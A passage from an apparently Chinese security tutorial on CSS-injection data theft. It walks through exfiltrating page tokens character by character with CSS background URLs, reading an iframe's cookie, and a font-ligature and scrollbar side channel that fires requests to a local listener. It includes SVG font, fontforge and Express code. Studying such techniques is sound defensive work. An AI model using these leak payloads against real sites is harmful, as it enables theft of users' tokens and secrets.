</span><span class=sb>                            background: url(http://127.0.0.1:3000/token/</span><span class=si>${</span><span class=nx>extractedToken</span><span class=si>}${</span><span class=kr>char</span><span class=si>}</span><span class=sb>)
</span><span class=sb>                        }`</span><span class=p>;</span>
                <span class=p>}</span>

                <span class=k>return</span> <span class=nx>css</span><span class=p>;</span>
            <span class=p>}</span>

            <span class=kd>function</span> <span class=nx>createIframeWithCss</span><span class=p>()</span> <span class=p>{</span>
                <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;http://127.0.0.1/css.php?css=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>generateCSS</span><span class=p>());</span>
            <span class=p>}</span>

        <span class=p>})();</span>
    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>效果如下图所示：</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122947.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122947.png loading=lazy>
</a>
</figure></p>
<h3 id=token1---same-origin>Token1 - Same Origin</h3>
<p>这个过程需要理解的就是在字符注入爆破成功时设置的 cookie ，它需要我们用 iframe src 同源的域名才能拿到这个 cookie ，否则会受到同源策略的限制拿不到，我们可以做一个简单的测试：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>big</span> <span class=na>id</span><span class=o>=</span><span class=s>token</span><span class=p>&gt;&lt;/</span><span class=nt>big</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1:3000/token/7&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1:3000/cookie.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
  <span class=p>(</span><span class=kr>async</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
    <span class=kr>const</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
    <span class=kr>const</span> <span class=nx>ALPHABET</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=s2>&#34;0123456789abcdef&#34;</span><span class=p>);</span>
    <span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
    <span class=kd>let</span> <span class=nx>extractedToken</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
    <span class=nx>clearTokenCookie</span><span class=p>();</span>
    <span class=nx>extractedToken</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getTokenFromCookie</span><span class=p>();</span>
    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>extractedToken</span><span class=p>;</span>

    <span class=kd>function</span> <span class=nx>getTokenFromCookie</span><span class=p>()</span> <span class=p>{</span>
      <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=kr>const</span> <span class=nx>interval</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
          <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>Cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
          <span class=k>if</span> <span class=p>(</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>interval</span><span class=p>);</span>
            <span class=nx>resolve</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
          <span class=p>}</span>
        <span class=p>},</span> <span class=mi>50</span><span class=p>);</span>
      <span class=p>});</span>
    <span class=p>}</span>
    <span class=kd>function</span> <span class=nx>clearTokenCookie</span><span class=p>()</span> <span class=p>{</span>
      <span class=nx>Cookies</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
    <span class=p>}</span>
  <span class=p>})();</span>
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1:3000/token/78&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122446.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122446.png loading=lazy>
</a>
</figure></p>
<p>这里<code>zedd.vv</code>映射到了 127.0.0.1 ，可以看到因为不同源，<code>zedd.vv</code>是拿不到 iframe 的 cookie 的，而通过 127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在<code>Path=/</code>，所以我们能在父页面也能拿到 iframe 当中的 cookie</p>
<h3 id=token2---font>Token2 - Font</h3>
<p>现在我们来尝试去获取 javascript 代码中的 token2，在开始之前我们先了解一下什么叫做连字：</p>
<ul>
<li><a class=link href=http://www.mzh.ren/ligature-intro.html target=_blank rel=noopener>连字简述</a></li>
<li><a class=link href=https://webzhao.me/ligatures.html target=_blank rel=noopener>连字那些事</a></li>
</ul>
<p>简而言之，字体中的连字是至少两个具有图形表示形式的字符的序列。最常见的连字可能是"fi"序列。在下面的图片中，我们可以很清晰地看到"f"与"i"；而在第二行中，我们对这两个字母的顺序使用了不同的字体表示-字母"f"的顶部连接到"i"上方的点。这里我们应该将连字与字距区别开来：字距调整仅确定字体中字母之间的距离，而连字是给定字符序列的完全独立的字形（图形符号）。</p>
<p><figure>
<a href=https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png><img src=https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png loading=lazy>
</a>
</figure></p>
<p>我们可以借助 fontforge 来生成我们需要的连字，因为现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式，我们可以准备一个名为 script.fontforge 的文件，内容如下：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/usr/bin/fontforge
</span><span class=cp></span>Open<span class=o>(</span><span class=nv>$1</span><span class=o>)</span>
Generate<span class=o>(</span><span class=nv>$1</span>:r + <span class=s2>&#34;.woff&#34;</span><span class=o>)</span>
</code></pre></div><p>我们可以用<code>fontforge script.fontforge &lt;plik>.svg</code>这个命令来生成 woff 文件，下面这段 svg 代码定义了一种名叫 hack 的字体，包括 a-z 26 个0宽度的字母，以及 sekurak 这个宽度为8000的连字。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>svg</span><span class=p>&gt;</span>
  <span class=p>&lt;</span><span class=nt>defs</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>font</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;hack&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span><span class=p>&gt;</span>
      <span class=p>&lt;</span><span class=nt>font-face</span> <span class=na>font-family</span><span class=o>=</span><span class=s>&#34;hack&#34;</span> <span class=na>units-per-em</span><span class=o>=</span><span class=s>&#34;1000&#34;</span> <span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>missing-glyph</span> <span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;a&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;b&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;c&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;d&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;e&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;f&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;g&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;h&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;i&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;j&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;k&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;l&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;m&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;n&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;o&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;p&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;q&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;r&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;s&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;t&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;u&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;v&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;w&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;y&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;z&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
      <span class=p>&lt;</span><span class=nt>glyph</span> <span class=na>unicode</span><span class=o>=</span><span class=s>&#34;sekurak&#34;</span> <span class=na>horiz-adv-x</span><span class=o>=</span><span class=s>&#34;8000&#34;</span> <span class=na>d</span><span class=o>=</span><span class=s>&#34;M1 0z&#34;</span><span class=p>/&gt;</span>
    <span class=p>&lt;/</span><span class=nt>font</span><span class=p>&gt;</span>
  <span class=p>&lt;/</span><span class=nt>defs</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>svg</span><span class=p>&gt;</span>
</code></pre></div><p>将以上代码保存为 test.svg，然后使用<code>fontforge ./script.fontforge test.svg</code>命令生成 test.woff ，我们再将其引入就好了。</p>
<p>这里我们做个简单的验证，将以下代码保存为 test.html</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
        <span class=p>@</span><span class=k>font-face</span> <span class=p>{</span>
            <span class=nt>font-family</span><span class=o>:</span> <span class=s2>&#34;hack&#34;</span><span class=o>;</span>
            <span class=nt>src</span><span class=o>:</span> <span class=nt>url</span><span class=o>(</span><span class=s2>&#34;./test.woff&#34;</span><span class=o>);</span>
        <span class=p>}</span>
        <span class=nt>span</span> <span class=p>{</span>
            <span class=k>background</span><span class=p>:</span> <span class=kc>lightblue</span><span class=p>;</span>
            <span class=k>font-family</span><span class=p>:</span> <span class=s2>&#34;hack&#34;</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nt>body</span> <span class=p>{</span>
            <span class=k>white-space</span><span class=p>:</span> <span class=kc>nowrap</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nt>body</span><span class=p>::</span><span class=nd>-webkit-scrollbar</span> <span class=p>{</span>
            <span class=k>background</span><span class=p>:</span> <span class=kc>blue</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nt>body</span><span class=p>::</span><span class=nd>-webkit-scrollbar</span><span class=p>:</span><span class=nd>horizontal</span> <span class=p>{</span>
            <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>http://127.0.0.1:9999</span><span class=p>);</span>
        <span class=p>}</span>
    <span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>span</span> <span class=na>id</span><span class=o>=</span><span class=s>span</span><span class=p>&gt;</span>123sekurak123<span class=p>&lt;/</span><span class=nt>span</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>然后用一个 font.html 用 iframe 将其引入:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1/test.html&#34;</span> <span class=na>frameborder</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;100px&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119230534.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119230534.png loading=lazy>
</a>
</figure></p>
<p>访问 test.html 之后我们可以看到收到了请求。</p>
<p>这里的原理也比较简单，在基于 WebKit 或其分支之一的浏览器中，我们可以使用<code>-webkit-scrollbar</code>来设置滚动条样式，而出现滚动条样式，我们需要使用<code>nowrap</code>让其不换行。这里需要注意的是，如果要完全设置样式，先得添加伪类<code>-webkit-scrollbar</code>，这样才能利用连字的宽度来触发<code>-webkit-scrollbar:horizontal</code>属性来执行我们的请求。</p>
<h3 id=token2---get-from-javascript>Token2 - Get From JavaScript</h3>
<p>从上面这个 demo 我们大概就可以得到一个思路了，将所有字体也都设置为0，然后用连字的方法来爆破得到 token2</p>
<p>这里直接给出波兰那位作者的代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
<span class=c1>// Serwer ExprssJS domyślnie dodaje nagłówek ETag,
</span><span class=c1>// ale nam nie jest to potrzebne, więc wyłączamy.
</span><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>disable</span><span class=p>(</span><span class=s1>&#39;etag&#39;</span><span class=p>);</span>

<span class=kr>const</span> <span class=nx>PORT</span> <span class=o>=</span> <span class=mi>3001</span><span class=p>;</span>
<span class=kr>const</span> <span class=nx>js2xmlparser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;js2xmlparser&#39;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>tmp</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;tmp&#39;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>rimraf</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;rimraf&#39;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>child_process</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>);</span>


<span class=c1>// Generujemy fonta dla zadanego przedrostka
</span><span class=c1>// i znaków, dla których ma zostać utworzona ligatura.
</span><span class=c1></span><span class=kd>function</span> <span class=nx>createFont</span><span class=p>(</span><span class=nx>prefix</span><span class=p>,</span> <span class=nx>charsToLigature</span><span class=p>)</span> <span class=p>{</span>
    <span class=kd>let</span> <span class=nx>font</span> <span class=o>=</span> <span class=p>{</span>
        <span class=s2>&#34;defs&#34;</span><span class=o>:</span> <span class=p>{</span>
            <span class=s2>&#34;font&#34;</span><span class=o>:</span> <span class=p>{</span>
                <span class=s2>&#34;@&#34;</span><span class=o>:</span> <span class=p>{</span>
                    <span class=s2>&#34;id&#34;</span><span class=o>:</span> <span class=s2>&#34;hack&#34;</span><span class=p>,</span>
                    <span class=s2>&#34;horiz-adv-x&#34;</span><span class=o>:</span> <span class=s2>&#34;0&#34;</span>
                <span class=p>},</span>
                <span class=s2>&#34;font-face&#34;</span><span class=o>:</span> <span class=p>{</span>
                    <span class=s2>&#34;@&#34;</span><span class=o>:</span> <span class=p>{</span>
                        <span class=s2>&#34;font-family&#34;</span><span class=o>:</span> <span class=s2>&#34;hack&#34;</span><span class=p>,</span>
                        <span class=s2>&#34;units-per-em&#34;</span><span class=o>:</span> <span class=s2>&#34;1000&#34;</span>
                    <span class=p>}</span>
                <span class=p>},</span>
                <span class=s2>&#34;glyph&#34;</span><span class=o>:</span> <span class=p>[]</span>
            <span class=p>}</span>
        <span class=p>}</span>
    <span class=p>};</span>
    
    <span class=c1>// Domyślnie wszystkie możliwe znaki mają zerową szerokość...
</span><span class=c1></span>    <span class=kd>let</span> <span class=nx>glyphs</span> <span class=o>=</span> <span class=nx>font</span><span class=p>.</span><span class=nx>defs</span><span class=p>.</span><span class=nx>font</span><span class=p>.</span><span class=nx>glyph</span><span class=p>;</span>
    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>c</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span> <span class=nx>c</span> <span class=o>&lt;=</span> <span class=mh>0x7e</span><span class=p>;</span> <span class=nx>c</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=kr>const</span> <span class=nx>glyph</span> <span class=o>=</span> <span class=p>{</span>
            <span class=s2>&#34;@&#34;</span><span class=o>:</span> <span class=p>{</span>
                <span class=s2>&#34;unicode&#34;</span><span class=o>:</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=nx>c</span><span class=p>),</span>
                <span class=s2>&#34;horiz-adv-x&#34;</span><span class=o>:</span> <span class=s2>&#34;0&#34;</span><span class=p>,</span>
                <span class=s2>&#34;d&#34;</span><span class=o>:</span> <span class=s2>&#34;M1 0z&#34;</span><span class=p>,</span>
            <span class=p>}</span>
        <span class=p>};</span>
        <span class=nx>glyphs</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>glyph</span><span class=p>);</span>
    <span class=p>}</span>
    
    <span class=c1>// ... za wyjątkiem ligatur, które są BARDZO szerokie.
</span><span class=c1></span>    <span class=nx>charsToLigature</span><span class=p>.</span><span class=nx>forEach</span><span class=p>(</span><span class=nx>c</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=kr>const</span> <span class=nx>glyph</span> <span class=o>=</span> <span class=p>{</span>
            <span class=s2>&#34;@&#34;</span><span class=o>:</span> <span class=p>{</span>
                <span class=s2>&#34;unicode&#34;</span><span class=o>:</span> <span class=nx>prefix</span> <span class=o>+</span> <span class=nx>c</span><span class=p>,</span>
                <span class=s2>&#34;horiz-adv-x&#34;</span><span class=o>:</span> <span class=s2>&#34;10000&#34;</span><span class=p>,</span>
                <span class=s2>&#34;d&#34;</span><span class=o>:</span> <span class=s2>&#34;M1 0z&#34;</span><span class=p>,</span>
            <span class=p>}</span>
        <span class=p>}</span>
        <span class=nx>glyphs</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>glyph</span><span class=p>);</span>
    <span class=p>});</span>
    
    <span class=c1>// Konwertujemy JSON-a na SVG.
</span><span class=c1></span>    <span class=kr>const</span> <span class=nx>xml</span> <span class=o>=</span> <span class=nx>js2xmlparser</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=s2>&#34;svg&#34;</span><span class=p>,</span> <span class=nx>font</span><span class=p>);</span>
    
    <span class=c1>// A następnie wykorzystujemy fontforge
</span><span class=c1></span>    <span class=c1>// do zamiany SVG na WOFF.
</span><span class=c1></span>    <span class=kr>const</span> <span class=nx>tmpobj</span> <span class=o>=</span> <span class=nx>tmp</span><span class=p>.</span><span class=nx>dirSync</span><span class=p>();</span>
